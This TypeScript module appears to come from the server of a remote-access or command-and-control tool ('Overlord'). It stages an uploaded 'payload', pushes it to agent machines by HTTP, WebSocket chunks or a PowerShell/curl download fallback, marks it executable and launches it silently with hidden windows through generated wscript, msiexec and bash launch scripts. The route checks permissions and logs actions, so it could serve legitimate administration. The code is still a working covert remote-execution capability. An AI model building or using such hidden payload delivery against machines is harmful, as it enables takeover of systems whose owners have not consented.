  '.js'  { $p = Start-Process -FilePath 'wscript.exe' -ArgumentList (@($path) + $argList) -WindowStyle ${windowStyle} -PassThru }
  '.msi' { $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList (@('/i', $path) + $argList) -WindowStyle ${windowStyle} -PassThru }
  '.exe' { $p = Start-Process -FilePath $path -ArgumentList $argList -WindowStyle ${windowStyle} -PassThru }
  '.com' { $p = Start-Process -FilePath $path -ArgumentList $argList -WindowStyle ${windowStyle} -PassThru }
  default {
    if ($argList.Count -gt 0) {
      $p = Start-Process -FilePath $path -ArgumentList $argList -WindowStyle ${windowStyle} -PassThru
    } else {
      $p = Start-Process -FilePath $path -WindowStyle ${windowStyle} -PassThru
    }
  }
}
Write-Output 'started'
`.trim(),
    };
  }

  const escaped = destinationPath.replace(/'/g, `'\\''`);
  const argStr = args.map((a) => `'${String(a).replace(/'/g, `'\\''`)}'`).join(" ");
  return {
    type: "bash",
    script: `
sleep ${EXEC_LAUNCH_DELAY_SEC}
path='${escaped}'
if [ ! -f "$path" ]; then
  echo missing_file
  exit 2
fi
chmod +x "$path" 2>/dev/null || true
"$path" ${argStr} >/dev/null 2>&1 &
echo started
`.trim(),
  };
}

async function uploadViaWsChunks(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
): Promise<CommandReplyResult> {
  job.transferMethod = "ws_chunks";
  job.usedTransferFallback = true;
  job.clientAcknowledged = true;
  job.lastClientStatus = "ws_fallback";
  job.lastClientMessage = "Retrying transfer via WebSocket chunks";
  job.updatedAt = now();
  clearIdleWatchdog(job);

  const transferId = `rex-ws-${job.id}`;
  const total = job.totalBytes;
  const ackTimeout = deps.wsChunkAckTimeoutMs ?? WS_CHUNK_ACK_TIMEOUT_MS;
  let nextOffset = 0;
  const inFlight = new Map<number, Promise<void>>();

  const sendChunk = async (offset: number, data: Uint8Array) => {
    if (isJobStopped(job) && job.status !== "running") {
      throw new Error("cancelled");
    }
    const cmdId = uuidv4();
    const result = await waitForUploadChunk(
      deps,
      job.clientId,
      {
        type: "command",
        commandType: "file_upload",
        id: cmdId,
        payload: {
          path: job.destinationPath,
          data,
          offset,
          total,
          transferId,
        },
      },
      ackTimeout,
    );
    if (!result.ok) {
      const err = result.error || "upload chunk failed";
      if (/unknown command/i.test(err)) {
        throw Object.assign(new Error(err), { code: "client_unsupported" });
      }
      throw Object.assign(new Error(err), { code: result.code || "client_transfer_failed" });
    }
    const received = Number(result.received);
    if (Number.isFinite(received) && received >= 0) {
      job.bytesTransferred = Math.min(received, total);
    } else {
      job.bytesTransferred = Math.min(Math.max(job.bytesTransferred, offset + data.length), total);
    }
    const cap = transferPercentCap(job);
    job.percent = total > 0 ? clampPercent((job.bytesTransferred / total) * cap) : job.percent;
    job.lastProgressAt = now();
    job.updatedAt = job.lastProgressAt;
    job.lastClientStatus = "transferring";
    job.lastClientMessage = `WS transferred ${job.bytesTransferred} of ${total} bytes`;
  };

  try {
    if (total === 0) {
      await sendChunk(0, new Uint8Array(0));
      return { ok: true, message: "ws upload complete" };
    }

    const fh = await fs.open(job.tmpFilePath, "r");
    try {
      while (nextOffset < total || inFlight.size > 0) {
        if (job.cancelled || job.status === "failed") {
          return { ok: false, code: "cancelled", message: "Remote execute cancelled by operator" };
        }
        while (inFlight.size < WS_CHUNK_CONCURRENCY && nextOffset < total) {
          const offset = nextOffset;
          const size = Math.min(WS_CHUNK_SIZE, total - offset);
          const buf = new Uint8Array(size);
          const { bytesRead } = await fh.read(buf, 0, size, offset);
          const chunk = bytesRead === size ? buf : buf.subarray(0, bytesRead);
          nextOffset = offset + chunk.length;
          const tracked = sendChunk(offset, chunk)
            .then(() => {
              inFlight.delete(offset);
            })
            .catch((err) => {
              inFlight.delete(offset);
              throw err;
            });
          inFlight.set(offset, tracked);
        }
        if (inFlight.size > 0) {
          await Promise.race(inFlight.values());
        }
      }
    } finally {
      await fh.close().catch(() => {});
    }
    return { ok: true, message: "ws upload complete" };
  } catch (error) {
    const err = error as Error & { code?: string };
    if (String(err.message || "") === "cancelled" || job.cancelled) {
      return { ok: false, code: "cancelled", message: "Remote execute cancelled by operator" };
    }
    return {
      ok: false,
      code: err.code || "client_transfer_failed",
      message: err.message || "WebSocket upload fallback failed",
    };
  }
}

async function uploadViaShellPull(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
): Promise<CommandReplyResult> {
  job.transferMethod = "shell_pull";
  job.usedTransferFallback = true;
  job.lastClientStatus = "shell_pull";
  job.lastClientMessage = "Downloading via shell (PowerShell/curl) fallback";
  job.updatedAt = now();
  clearIdleWatchdog(job);

  const fullUploadTimeout = deps.uploadTimeoutMs ?? UPLOAD_TIMEOUT_MS;
  const shellTimeout = deps.shellPullTimeoutMs ?? Math.min(fullUploadTimeout, SCRIPT_PULL_TIMEOUT_MS);
  ensureJobPullAlive(job, fullUploadTimeout);

  // Shell downloaders need an absolute URL (no agent-side relative rewrite).
  const pullUrl = job.pullOrigin || job.pullPath;
  if (!pullUrl || !/^https?:\/\//i.test(pullUrl)) {
    return {
      ok: false,
      code: "client_transfer_failed",
      message:
        "shell pull requires an absolute pull origin; set OVERLORD_EXTERNAL_URL to an agent-reachable https origin",
    };
  }

  const launch = buildRemoteExecuteShellPullScript(
    job.destinationPath,
    pullUrl,
    job.pullSecret,
    job.clientId,
    job.totalBytes,
    job.clientOs,
  );

  const scriptResult = await waitForScriptResult(
    deps,
    job.clientId,
    launch.script,
    launch.type,
    shellTimeout,
  );

  if (job.cancelled) {
    return { ok: false, code: "cancelled", message: "Remote execute cancelled by operator" };
  }

  if (!scriptResult.ok) {
    return {
      ok: false,
      code: scriptResult.code || "client_transfer_failed",
      message: scriptResult.error || scriptResult.result || "shell pull failed",
    };
  }

  const out = String(scriptResult.result || "");
  if (/missing_file|size_mismatch|download_failed/i.test(out)) {
    return { ok: false, code: "client_transfer_failed", message: out || "shell pull failed" };
  }

  job.bytesTransferred = job.totalBytes;
  job.percent = transferPercentCap(job);
  job.clientAcknowledged = true;
  return { ok: true, message: "shell pull complete" };
}

async function transferToClient(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
): Promise<boolean> {
  if (isJobStopped(job)) return false;

  setJobPhase(job, "client_transfer", 0);
  job.commandSentAt = now();
  job.transferMethod = "http_pull";
  job.transferEpoch += 1;
  const httpEpoch = job.transferEpoch;
  const uploadCommandId = uuidv4();
  job.uploadCommandId = uploadCommandId;

  const fullUploadTimeout = deps.uploadTimeoutMs ?? UPLOAD_TIMEOUT_MS;
  const probeTimeout = deps.httpProbeTimeoutMs ?? HTTP_PROBE_TIMEOUT_MS;
  ensureJobPullAlive(job, fullUploadTimeout);

  // Soft-fail HTTP early when any fallback remains (WS and/or shell).
  const earlyProbe =
    wsFallbackEligible(job) || shellPullEnabled(deps);

  scheduleIdleWatchdog(job, deps);

  const uploadUrl = selectUploadPullUrl({
    clientVersion: job.clientVersion,
    pullPath: job.pullPath,
    pullOrigin: job.pullOrigin,
  });
  logger.info(
    `[remote-execute] upload ${job.originalName} → ${job.destinationPath} via ${uploadUrl} (display=${job.pullOrigin}, clientVersion=${job.clientVersion || "unknown"}, ${job.totalBytes} bytes, mode=${job.mode})`,
  );

  let probeTimer: NodeJS.Timeout | undefined;
  const uploadWait = waitForCommandReply(
    deps,
    job.clientId,
    {
      type: "command",
      commandType: "file_upload_http",
      id: uploadCommandId,
      payload: {
        path: job.destinationPath,
        url: uploadUrl,
        total: job.totalBytes,
      },
    },
    {
      code: "client_transfer_timeout",
      message: "client did not complete pulling the file before the transfer timeout",
    },
    fullUploadTimeout,
    (payload) => {
      if (job.transferEpoch !== httpEpoch) return;
      updateJobFromProgress(job, payload, deps);
    },
  );

  if (earlyProbe) {
    probeTimer = setTimeout(() => {
      if (job.status !== "running" || job.phase !== "client_transfer") return;
      if (job.transferEpoch !== httpEpoch) return;
      if (job.clientAcknowledged) return;
      if (job.transferComplete) return;
      softFailHttpTransfer(job, deps, {
        ok: false,
        code: "client_transfer_idle",
        message: buildNoAckFailureMessage(job, probeTimeout).message,
      });
    }, probeTimeout);
  }

  let uploadResult = await uploadWait;
  if (probeTimer) clearTimeout(probeTimer);
  clearIdleWatchdog(job);

  if (job.cancelled || job.status === "failed") return false;
  if (job.transferEpoch !== httpEpoch) return false;

  if (uploadResult.ok) {
    job.clientAcknowledged = true;
  }

  recordTransferAttempt(job, "http_pull", uploadResult);

  if (!uploadResult.ok) {
    const clientMsg = String(uploadResult.message || "");
    const looksUnknown =
      /unknown command/i.test(clientMsg) || /unsupported .* command version/i.test(clientMsg);
    let failureCode = uploadResult.code || "client_transfer_failed";
    let failureMessage =
      (uploadResult.code === "client_transfer_timeout" || uploadResult.code === "client_transfer_idle") &&
      !job.clientAcknowledged
        ? buildNoAckFailureMessage(
            job,
            uploadResult.code === "client_transfer_idle" ? probeTimeout : fullUploadTimeout,
          ).message
        : uploadResult.message || "Failed to upload file to client";
    if (looksUnknown) {
      failureCode = "client_unsupported";
      failureMessage = `client rejected file_upload_http (${clientMsg || "unknown command"}); rebuild agent to ≥ ${REMOTE_EXECUTE_MIN_VERSION}`;
    } else if (
      /invalid upload url/i.test(clientMsg) &&
      !clientSupportsRelativeUploadPull(job.clientVersion)
    ) {
      failureCode = "client_transfer_failed";
      failureMessage =
        `client rejected pull URL (${clientMsg}); set OVERLORD_EXTERNAL_URL to an agent-reachable https origin, or rebuild agent to ≥ ${REMOTE_EXECUTE_MIN_VERSION}`;
    }

    const httpResult = { ...uploadResult, code: failureCode, message: failureMessage };
    abortClientCommand(job.clientId, job.uploadCommandId);
    job.uploadCommandId = undefined;

    let transferred = false;

    if (isHttpFallbackEligible(job, httpResult, failureCode)) {
      logger.info(
        `[remote-execute] HTTP transfer failed (${failureCode}); falling back to WS chunks for job ${job.id}`,
      );
      job.transferEpoch += 1;
      job.bytesTransferred = 0;
      job.bytesAtLastProgress = 0;
      await settleBeforeMethodSwitch(deps);
      if (job.cancelled || isTerminalFailure(job)) return false;

      const wsResult = await uploadViaWsChunks(job, deps);
      recordTransferAttempt(job, "ws_chunks", wsResult);
      if (job.cancelled || isTerminalFailure(job)) return false;

      if (wsResult.ok) {
        uploadResult = wsResult;
        transferred = true;
      } else {
        uploadResult = wsResult;
        failureCode = wsResult.code || failureCode;
        failureMessage = wsResult.message || failureMessage;
      }
    }

    if (!transferred && isShellPullEligible(job, httpResult, failureCode, deps)) {
      logger.info(
        `[remote-execute] falling back to shell pull for job ${job.id} after ${failureCode}`,
      );
      job.transferEpoch += 1;
      job.bytesTransferred = 0;
      job.bytesAtLastProgress = 0;
      await settleBeforeMethodSwitch(deps);
      if (job.cancelled || isTerminalFailure(job)) return false;

      const shellResult = await uploadViaShellPull(job, deps);
      recordTransferAttempt(job, "shell_pull", shellResult);
      if (job.cancelled || isTerminalFailure(job)) return false;

      if (shellResult.ok) {
        uploadResult = shellResult;
        transferred = true;
      } else {
        uploadResult = shellResult;
        failureCode = shellResult.code || failureCode;
        failureMessage = shellResult.message || failureMessage;
      }
    }

    if (!transferred) {
      const attempts = job.transferAttempts.map((a) => `${a.method}:${a.ok ? "ok" : a.code || "fail"}`).join(", ");
      failJob(job, failureCode, failureMessage, {
        phase: "client_transfer",
        clientMessage: uploadResult.message,
        serverMessage: attempts ? `transfer attempts: ${attempts}` : undefined,
      }, deps);
      return false;
    }
  } else {
    job.transferMethod = "http_pull";
  }

  clearIdleWatchdog(job);
  job.transferComplete = true;
  job.bytesTransferred = job.totalBytes;
  job.percent = transferPercentCap(job);
  job.uploadCommandId = undefined;
  job.clientAcknowledged = true;

  if (job.clientOs !== "windows" && !job.chmodDone) {
    setJobPhase(job, "chmod", job.mode === "upload_only" ? 98 : 92);
    const chmodResult = await waitForCommandReply(
      deps,
      job.clientId,
      {
        type: "command",
        commandType: "file_chmod",
        id: uuidv4(),
        payload: { path: job.destinationPath, mode: "0755" },
      },
      {
        code: "chmod_timeout",
        message: "chmod timed out on the client",
      },
      60_000,
    );
    if (job.cancelled || isTerminalFailure(job)) return false;
    if (!chmodResult.ok) {
      failJob(job, chmodResult.code || "chmod_failed", chmodResult.message || "Failed to set execute permissions", {
        phase: "chmod",
        clientMessage: chmodResult.message,
      }, deps);
      return false;
    }
    job.chmodDone = true;
  }

  return true;
}

async function executeOnClient(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
  user: { username: string },
  ip: string,
  opts: { fromReady?: boolean } = {},
): Promise<boolean> {
  if (job.cancelled) return false;

  setJobPhase(job, "execute", opts.fromReady ? 20 : 96);
  rescheduleJobCleanup(job, READY_TTL_MS);

  const execResult = await waitForCommandReply(
    deps,
    job.clientId,
    {
      type: "command",
      commandType: "silent_exec",
      id: uuidv4(),
      payload: {
        command: job.destinationPath,
        args: job.args,
        hideWindow: job.hideWindow,
      },
    },
    {
      code: "execute_timeout",
      message: "execution start timed out on the client",
    },
    deps.execTimeoutMs ?? EXEC_TIMEOUT_MS,
  );

  if (job.cancelled) return false;

  if (!execResult.ok) {
    if (execResult.code === "send_command_failed" && /offline/i.test(String(execResult.message || ""))) {
      if (opts.fromReady) {
        job.status = "ready";
        job.phase = "ready";
        job.percent = 100;
        job.updatedAt = now();
        job.lastError = {
          code: "client_offline",
          message: execResult.message || "Client is offline",
        };
        return false;
      }
    }

    if (isExecFallbackEligible(execResult)) {
      logger.info(
        `[remote-execute] silent_exec failed (${execResult.message}); trying script_exec fallback for job ${job.id}`,
      );
      job.usedExecFallback = true;
      job.lastClientStatus = "script_fallback";
      job.lastClientMessage = "Launching via script_exec fallback";
      const launch = buildRemoteExecuteLaunchScript(
        job.destinationPath,
        job.args,
        job.hideWindow,
        job.clientOs,
      );
      const scriptResult = await waitForScriptResult(
        deps,
        job.clientId,
        launch.script,
        launch.type,
        deps.scriptTimeoutMs ?? SCRIPT_TIMEOUT_MS,
      );

      if (job.cancelled) return false;

      if (!scriptResult.ok) {
        const scriptErr = scriptResult.error || "script_exec fallback failed";
        const combined = `silent_exec: ${execResult.message || "failed"}; script_exec fallback: ${scriptErr}`;
        if (opts.fromReady) {
          if (isMissingFileError(scriptErr) || isMissingFileError(String(scriptResult.result || ""))) {
            failJob(job, "missing_file", combined, {
              phase: "execute",
              clientMessage: scriptErr,
            }, deps);
            return false;
          }
          job.status = "ready";
          job.phase = "ready";
          job.percent = 100;
          job.updatedAt = now();
          job.lastError = { code: "execute_failed", message: combined };
          return false;
        }
        failJob(job, "execute_failed", combined, {
          phase: "execute",
          clientMessage: scriptErr,
        }, deps);
        return false;
      }

      if (isMissingFileError(String(scriptResult.result || ""))) {
        const msg = "upload completed but destination file was not found on the client";
        failJob(job, "missing_file", msg, { phase: "execute", clientMessage: scriptResult.result }, deps);
        return false;
      }
    } else if (execResult.code === "execute_timeout") {
      // Never second-launch on timeout (process may already be running).
      if (opts.fromReady) {
        job.status = "ready";
        job.phase = "ready";
        job.percent = 100;
        job.updatedAt = now();
        job.lastError = {
          code: "execute_timeout",
          message: execResult.message || "execution start timed out on the client",
        };
        return false;
      }
      failJob(job, "execute_timeout", execResult.message || "execution start timed out on the client", {
        phase: "execute",
        clientMessage: execResult.message,
      }, deps);
      return false;
    } else {
      const msg = execResult.message || "Failed to start remote execution";
      if (opts.fromReady) {
        if (isMissingFileError(msg)) {
          failJob(job, "missing_file", msg, { phase: "execute", clientMessage: msg }, deps);
          return false;
        }
        job.status = "ready";
        job.phase = "ready";
        job.percent = 100;
        job.updatedAt = now();
        job.lastError = { code: execResult.code || "execute_failed", message: msg };
        return false;
      }
      failJob(job, execResult.code || "execute_failed", msg, {
        phase: "execute",
        clientMessage: execResult.message,
      }, deps);
      return false;
    }
  }

  logAudit({
    timestamp: Date.now(),
    username: user.username,
    ip,
    action: AuditAction.SILENT_EXECUTE,
    targetClientId: job.clientId,
    success: true,
    details: JSON.stringify({
      remoteExecute: true,
      mode: job.mode,
      file: job.originalName,
      path: job.destinationPath,
      args: job.args,
      hideWindow: job.hideWindow,
      bytes: job.totalBytes,
      transferMethod: job.transferMethod,
      usedTransferFallback: job.usedTransferFallback,
      usedExecFallback: job.usedExecFallback,
    }),
  });
  metrics.recordCommand(job.usedExecFallback ? "script_exec" : "silent_exec");
  succeedJob(job);
  return true;
}

async function runRemoteExecuteJob(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
  user: { username: string },
  ip: string,
) {
  try {
    if (job.cancelled || isTerminalFailure(job)) return;

    const transferred = await transferToClient(job, deps);
    if (!transferred) return;
    if (job.cancelled || isTerminalFailure(job)) return;

    if (job.mode === "upload_only") {
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.FILE_UPLOAD,
        targetClientId: job.clientId,
        success: true,
        details: JSON.stringify({
          remoteExecute: true,
          mode: "upload_only",
          file: job.originalName,
          path: job.destinationPath,
          bytes: job.totalBytes,
          transferMethod: job.transferMethod,
          usedTransferFallback: job.usedTransferFallback,
        }),
      });
      markJobReady(job);
      return;
    }

    await executeOnClient(job, deps, user, ip, { fromReady: false });
  } catch (error) {
    failJob(job, "remote_execute_job_failed", (error as Error)?.message || "Remote execute job failed", {
      serverMessage: (error as Error)?.stack || String(error),
    });
  }
}

async function runExecuteOnly(
  job: RemoteExecuteJob,
  deps: RemoteExecuteRouteDeps,
  user: { username: string },
  ip: string,
): Promise<{ ok: boolean; status: number; body: Record<string, unknown> }> {
  if (job.status !== "ready") {
    return {
      ok: false,
      status: 409,
      body: {
        ...serializeJob(job),
        ok: false,
        code: "not_ready",
        message: `Job is not ready to execute (status=${job.status})`,
      },
    };
  }

  const target = clientManager.getClient(job.clientId);
  if (!target?.ws) {
    return {
      ok: false,
      status: 409,
      body: {
        ...serializeJob(job),
        ok: false,
        code: "client_offline",
        message: "Client is offline",
      },
    };
  }

  // Atomic claim
  job.status = "running";
  job.phase = "execute";
  job.percent = 10;
  job.updatedAt = now();
  job.lastError = undefined;
  job.error = undefined;

  void executeOnClient(job, deps, user, ip, { fromReady: true }).then(() => {
    /* status polled via GET */
  });

  return {
    ok: true,
    status: 200,
    body: {
      ...serializeJob(job),
      ok: true,
    },
  };
}

export async function handleRemoteExecuteRoutes(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: RemoteExecuteRouteDeps,
): Promise<Response | null> {
  const executeMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/remote-execute\/([^/]+)\/execute$/);
  const statusMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/remote-execute\/([^/]+)$/);
  const postMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/remote-execute$/);

  if (req.method === "POST" && executeMatch) {
    // handled below after auth
  } else if (req.method === "GET" && !statusMatch) {
    return null;
  } else if (req.method === "DELETE" && !statusMatch) {
    return null;
  } else if (req.method === "POST" && !postMatch && !executeMatch) {
    return null;
  } else if (req.method !== "GET" && req.method !== "POST" && req.method !== "DELETE") {
    return null;
  }

  // Ensure deps maps exist (tests may omit)
  if (!deps.pendingScripts) (deps as any).pendingScripts = new Map();
  if (!deps.pendingFileUploadChunks) (deps as any).pendingFileUploadChunks = new Map();

  const user = await authenticateRequest(req);
  if (!user) return new Response("Unauthorized", { status: 401 });

  try {
    requirePermission(user, "clients:silent-exec");
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  if (req.method === "POST" && executeMatch) {
    const targetId = decodeURIComponent(executeMatch[1]);
    const jobId = decodeURIComponent(executeMatch[2]);
    try {
      requireClientAccess(user, targetId);
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }
    const job = remoteExecuteJobs.get(jobId);
    if (!job || job.clientId !== targetId) {
      return Response.json({ ok: false, code: "not_found", message: "Job not found" }, { status: 404 });
    }

    let body: any = {};
    try {
      const text = await req.text();
      if (text) body = JSON.parse(text);
    } catch {
      body = {};
    }
    if (body.args !== undefined) job.args = parseArgs(body.args);
    if (body.hideWindow !== undefined) job.hideWindow = parseHideWindow(body.hideWindow);

    const ip = server.requestIP(req)?.address || "unknown";
    const result = await runExecuteOnly(job, deps, user, ip);
    return Response.json(result.body, { status: result.status });
  }

  if ((req.method === "GET" || req.method === "DELETE") && statusMatch) {
    const targetId = decodeURIComponent(statusMatch[1]);
    const jobId = decodeURIComponent(statusMatch[2]);
    try {
      requireClientAccess(user, targetId);
    } catch (error) {
      if (error instanceof Response) return error;
      return new Response("Forbidden", { status: 403 });
    }
    const job = remoteExecuteJobs.get(jobId);
    if (!job || job.clientId !== targetId) {
      return Response.json({ ok: false, message: "Job not found" }, { status: 404 });
    }

    if (req.method === "DELETE") {
      const cancelled = cancelRemoteExecuteJob(job, deps);
      return Response.json({
        ...serializeJob(job),
        ok: true,
        cancelled,
      });
    }

    return Response.json(serializeJob(job));
  }

  if (req.method !== "POST" || !postMatch) return null;

  const targetId = decodeURIComponent(postMatch[1]);
  try {
    requireClientAccess(user, targetId);
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }

  const target = clientManager.getClient(targetId);
  if (!target?.ws) {
    return Response.json({ ok: false, message: "Client is offline" }, { status: 409 });
  }

  let form: FormData;
  try {
    form = await req.formData();
  } catch {
    return Response.json({ ok: false, message: "Invalid multipart form data" }, { status: 400 });
  }

  const file = form.get("file");
  if (!(file instanceof File)) {
    return Response.json({ ok: false, message: "Missing file" }, { status: 400 });
  }
  if (file.size <= 0) {
    return Response.json({ ok: false, message: "File is empty" }, { status: 400 });
  }
  if (file.size > MAX_FILE_SIZE) {
    return Response.json(
      {
        ok: false,
        message: `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${MAX_FILE_SIZE / 1024 / 1024} MB.`,
      },
      { status: 413 },
    );
  }

  const safeName = sanitizeUploadFilename(file.name, "payload.bin");
  const args = parseArgs(form.get("args"));
  const hideWindow = parseHideWindow(form.get("hideWindow"));
  const mode = parseMode(form.get("mode"));
  const clientOs = normalizeClientOs(target.os);
  const jobId = uuidv4();
  const destinationPath = destinationForClient(clientOs, jobId, safeName);

  const tmpDir = os.tmpdir();
  const tmpFilePath = path.join(tmpDir, `overlord_rex_${jobId}_${safeName}`);
  const bytes = new Uint8Array(await file.arrayBuffer());

  try {
    await fs.writeFile(tmpFilePath, bytes);
  } catch (error) {
    return Response.json(
      {
        ok: false,
        code: "upload_staging_failed",
        message: "Failed to stage file on server",
        serverMessage: (error as Error)?.message,
      },
      { status: 500 },
    );
  }

  const pullSecret = uuidv4();
  const pullId = createUploadPull({
    clientId: targetId,
    filePath: tmpFilePath,
    fileName: safeName,
    size: bytes.length,
    ttlMs: UPLOAD_TIMEOUT_MS,
    pullSecret,
  });
  const pullEndpoint = buildPullEndpoints(req, pullId);
  const startedAt = now();
  const job: RemoteExecuteJob = {
    id: jobId,
    clientId: targetId,
    mode,
    originalName: file.name || safeName,
    safeName,
    args,
    hideWindow,
    tmpFilePath,
    pullId,
    pullOrigin: pullEndpoint.originUrl,
    pullPath: pullEndpoint.path,
    endpointSource: pullEndpoint.source,
    clientVersion: target.version,
    clientOs,
    clientAcknowledged: false,
    transferComplete: false,
    chmodDone: false,
    transferAttempts: [],
    transferEpoch: 0,
    bytesAtLastProgress: 0,
    pullSecret,
    usedTransferFallback: false,
    usedExecFallback: false,
    destinationPath,
    totalBytes: bytes.length,
    bytesTransferred: 0,
    speedBytesPerSecond: 0,
    percent: 0,
    phase: "staging",
    status: "running",
    startedAt,
    updatedAt: startedAt,
    expiresAt: startedAt + JOB_TTL_MS,
    timeout: null as any,
  };
  job.timeout = scheduleJobCleanup(job);
  remoteExecuteJobs.set(job.id, job);

  const ip = server.requestIP(req)?.address || "unknown";
  void runRemoteExecuteJob(job, deps, user, ip);

  return Response.json({
    ok: true,
    jobId: job.id,
    mode: job.mode,
    destinationPath: job.destinationPath,
    totalBytes: job.totalBytes,
    phase: job.phase,
    status: job.status,
    percent: job.percent,
    pullOrigin: job.pullOrigin,
    endpointSource: job.endpointSource,
    clientVersion: job.clientVersion,
    originalName: job.originalName,
    transferState: transferState(job),
    canExecute: false,
    expiresAt: job.expiresAt,
  });
}
